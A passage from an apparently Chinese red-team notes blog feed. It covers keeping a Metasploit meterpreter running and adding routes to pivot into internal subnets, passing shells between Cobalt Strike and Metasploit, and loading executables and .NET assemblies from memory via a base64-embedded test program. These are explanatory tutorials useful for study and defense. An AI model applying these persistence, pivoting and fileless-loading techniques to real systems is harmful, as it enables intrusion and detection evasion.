777 mshell.elf\nroot@web01:/home/mason# nohup ./mshell.elf &amp;\n[1] 1863420\nroot@web01:/home/mason# nohup: ignoring input and appending output to 'nohup.out'\n</code></pre></div><p>重要的是<code>nohup ./mshell.elf &amp;</code>，持续运行。</p>\n<p>msf的meterpreter有<code>upload</code>和<code>download</code>命令，可以上传或下载文件。</p>\n<h3>MSF添加路由和代理</h3>\n<p><a href=\"https://blog.csdn.net/m0_55793759/article/details/126514312\" target=\"_blank\" rel=\"noopener noreferrer\">论后渗透MSF之 | 添加路由和代理</a></p>\n<p>跳板实现过程</p>\n<p>（1）需要有一个已经获取的meterpreter会话；</p>\n<p>（2）获取内网地址网段；</p>\n<p>（3）在MSF平台上添加去往内网网段的路由。</p>\n<h4>路由</h4>\n<p>在获取一个session会话后，获取目标内网相关信息</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>meterpreter &gt; run get_local_subnets\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\nLocal subnet: 192.168.0.0/255.255.0.0\n</code></pre></div><p>添加路由的方式1：路由添加到每个网段，动态路由</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>meterpreter &gt; run post/multi/manage/autoroute\n\n[!] SESSION may not be compatible with this module.\n[*] Running module against web01.blackops.local\n[*] Searching for subnets to autoroute.\n[+] Route added to subnet 192.168.0.0/255.255.0.0 from host's routing table.\n\n</code></pre></div><p>添加路由的方式2：配置静态路由，即一次只添加一个网段路由</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>run autoroute –h //帮助命令查询\nrun autoroute -s 10.0.20.0/24 //静态路由添加\n</code></pre></div><p>添加以后查看路由表</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>meterpreter &gt; run autoroute -p\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n\nActive Routing Table\n====================\n\n   Subnet             Netmask            Gateway\n</code></pre></div>",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "CS和MSF相互弹shell",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/C2/MSF_CS.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/C2/MSF_CS.html",
      "summary": "CS和MSF相互弹shell\nMSF 2 CS\nCS先正常起一个监听：\nimage-20230614175634459image-20230614175634459\nMSF配置;\nimage-20230614173501998image-20230614173501998\nrun完CS就接到了\nimage-20230614175804223image-...",
      "content_html": "\n<h3>MSF 2 CS</h3>\n<p>CS先正常起一个监听：</p>\n<figure><figcaption>image-20230614175634459</figcaption></figure>\n<p>MSF配置;</p>\n<figure><figcaption>image-20230614173501998</figcaption></figure>\n<p>run完CS就接到了</p>\n<figure><figcaption>image-20230614175804223</figcaption></figure>\n<h3>CS 2 MSF</h3>\n<p>先msf监听，4.8版本为例，只支持http</p>\n<figure><figcaption>image-20230614174733555</figcaption></figure>\n<p>然后CS如下：</p>\n<figure><figcaption>image-20230614174346203</figcaption></figure>\n<figure><figcaption>image-20230614174232752</figcaption></figure>\n<figure><figcaption>image-20230614174641725</figcaption></figure>\n<p>然后msf接到了</p>\n<figure><figcaption>image-20230614174847095</figcaption></figure>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "内存加载执行文件的方法",
      "url": "https://echo0d.github.io/DailyNotes/develop/CSharp/PELoader.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/CSharp/PELoader.html",
      "summary": "内存加载执行文件的方法\n分两部分：\n\n.NET程序集\nPE文件\n\n0. 执行本地文件\n此处以C#和C++为例：AI都会写\nexe\n在C#中执行一个.exe文件可以使用Process类，\n而在C++中可以使用CreateProcess函数。\ndll\n在C#中执行一个.dll文件通常涉及在应用程序中加载并调用该.dll中的函数。\n在C++中执行一个.dll...",
      "content_html": "\n<p>分两部分：</p>\n<ul>\n<li>.NET程序集</li>\n<li>PE文件</li>\n</ul>\n<h2>0. 执行本地文件</h2>\n<p>此处以C#和C++为例：AI都会写</p>\n<h3>exe</h3>\n<p>在C#中执行一个<code>.exe</code>文件可以使用<code>Process</code>类，</p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Diagnostics</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        Process<span class=\"token punctuation\">.</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\file.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>而在C++中可以使用<code>CreateProcess</code>函数。</p>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h&gt;</span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    STARTUPINFO si<span class=\"token punctuation\">;</span>\n    PROCESS_INFORMATION pi<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>si<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>si<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    si<span class=\"token punctuation\">.</span>cb <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>si<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>pi<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>pi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Start the child process.</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">CreateProcess</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"C:\\\\file.exe\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>si<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateProcess failed (%d).\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Wait until child process exits.</span>\n    <span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>pi<span class=\"token punctuation\">.</span>hProcess<span class=\"token punctuation\">,</span> INFINITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Close process and thread handles.</span>\n    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>pi<span class=\"token punctuation\">.</span>hProcess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>pi<span class=\"token punctuation\">.</span>hThread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>dll</h3>\n<p>在C#中执行一个<code>.dll</code>文件通常涉及在应用程序中加载并调用该<code>.dll</code>中的函数。</p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Runtime<span class=\"token punctuation\">.</span>InteropServices</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\dll_file.dll\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">YourFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 假设要调用的函数没有返回值</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">YourFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 调用从DLL中导入的函数</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在C++中执行一个<code>.dll</code>文件通常是通过加载动态链接库并调用其中的函数。</p>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h&gt;</span></span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>YourFunction<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 假设要调用的函数没有返回值</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    HINSTANCE hDLL <span class=\"token operator\">=</span> <span class=\"token function\">LoadLibrary</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\dll_file.dll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hDLL <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        YourFunction yourFunction <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>YourFunction<span class=\"token punctuation\">)</span><span class=\"token function\">GetProcAddress</span><span class=\"token punctuation\">(</span>hDLL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"YourFunction\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>yourFunction <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">yourFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 调用从DLL中导入的函数</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 处理函数加载失败的情况</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">FreeLibrary</span><span class=\"token punctuation\">(</span>hDLL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 处理DLL加载失败的情况</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h2>1. managed代码内存加载.NET程序集</h2>\n<p><strong>(Assembly.Load)</strong></p>\n<p>使用C#从内存中加载.NET程序集，直接用<code>Assembly.Load</code>就行了。</p>\n<p><a href=\"https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.5\" target=\"_blank\" rel=\"noopener noreferrer\">Assembly.Load Method (System.Reflection) | Microsoft Learn</a></p>\n<h3>1.1. 三种Load的区别</h3>\n<p><strong><code>Assembly.Load()</code>、<code>Assembly.LoadFrom()</code>和<code>Assembly.LoadFile()</code></strong></p>\n<ul>\n<li>\n<p><code>Assembly.Load()</code>是从String或AssemblyName类型加载程序集，可以读取字符串形式的程序集，也就是说，文件不需要写入硬盘</p>\n</li>\n<li>\n<p><code>Assembly.LoadFrom()</code>从指定文件中加载程序集，同时会加载目标程序集所引用和依赖的其他程序集，例如：<code>Assembly.LoadFrom(\"a.dll\")</code>，如果a.dll中引用了b.dll，那么会同时加载a.dll和b.dll</p>\n</li>\n<li>\n<p><code>Assembly.LoadFile()</code>也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集，例如：<code>Assembly.LoadFile(\"a.dll\")</code>，如果a.dll中引用了b.dll，那么不会加载b.dll</p>\n</li>\n</ul>\n<h3>1.2. C#反射加载流程</h3>\n<p><strong>(1) 编写测试程序</strong></p>\n<p>测试程序的代码如下：</p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token namespace\">TestApplication</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n\t<span class=\"token punctuation\">{</span>\n    \t\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \t\t<span class=\"token punctuation\">{</span>\n        \t\tConsole<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Main\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">aaa</span>\n\t<span class=\"token punctuation\">{</span>\n    \t\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">bbb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \t\t<span class=\"token punctuation\">{</span>\n        \t\t<span class=\"token class-name\">System<span class=\"token punctuation\">.</span>Diagnostics<span class=\"token punctuation\">.</span>Process</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">System<span class=\"token punctuation\">.</span>Diagnostics<span class=\"token punctuation\">.</span>Process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \t\tp<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>FileName <span class=\"token operator\">=</span> <span class=\"token string\">\"c:\\\\windows\\\\system32\\\\calc.exe\"</span><span class=\"token punctuation\">;</span>\n        \t\tp<span class=\"token punctuation\">.</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>使用csc.exe进行编译：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:testcalc.exe test.cs\n</code></pre></div><p>生成testcalc.exe</p>\n<p><strong>(2) 测试的.exe作base64编码</strong></p>\n<p>代码如下：</p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Reflection</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token namespace\">TestApplication</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n\n            <span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> buffer <span class=\"token operator\">=</span> System<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">.</span>File<span class=\"token punctuation\">.</span><span class=\"token function\">ReadAllBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"testcalc.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> base64str <span class=\"token operator\">=</span> Convert<span class=\"token punctuation\">.</span><span class=\"token function\">ToBase64String</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            Console<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span>base64str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><strong>(3) 还原.exe的内容</strong></p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Reflection</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token namespace\">TestApplication</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n\n            <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> base64str <span class=\"token operator\">=</span> <span class=\"token string\">\"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BTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBKwBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAIgBAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAwAC4AMAAuADAALgAwAAAAPAANAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAAB0AGUAcwB0AGMAYQBsAGMALgBlAHgAZQAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEQADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAAB0AGUAcwB0AGMAYQBsAGMALgBlAHgAZQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQospan><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> buffer <span class=\"token operator\">=</span> Convert<span class=\"token punctuation\">.</span><span class=\"token function\">FromBase64String</span><span class=\"token punctuation\">(</span>base64str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n</code></pre></div><p><strong>(4) 使用Assembly.Load()加载程序集并调用方法</strong></p>\n<p>代码如下：</p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Reflection</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token namespace\">TestApplication</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n\n            <span class=\"token 